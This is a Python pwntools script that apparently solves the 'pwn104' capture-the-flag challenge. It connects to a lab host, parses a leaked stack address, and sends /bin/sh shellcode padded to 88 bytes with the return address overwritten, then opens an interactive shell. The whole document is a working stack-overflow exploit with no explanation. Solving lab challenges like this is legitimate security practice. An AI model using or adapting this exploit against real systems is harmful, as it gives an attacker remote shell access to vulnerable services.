from pwn import *

context.binary = elf = ELF('./pwn104-1644300377109.pwn104')

# p = process("./pwn104.pwn104")
p = remote("10.10.206.177", 9004)

p.recvuntil(b'at ')
address = p.recvline()
bufferLocation = p64(int(address, 16))

shellcode = asm(shellcraft.sh())
payload = shellcode
payload = payload.ljust(88, b'A')
payload += bufferLocation

p.sendline(payload)
p.interactive()
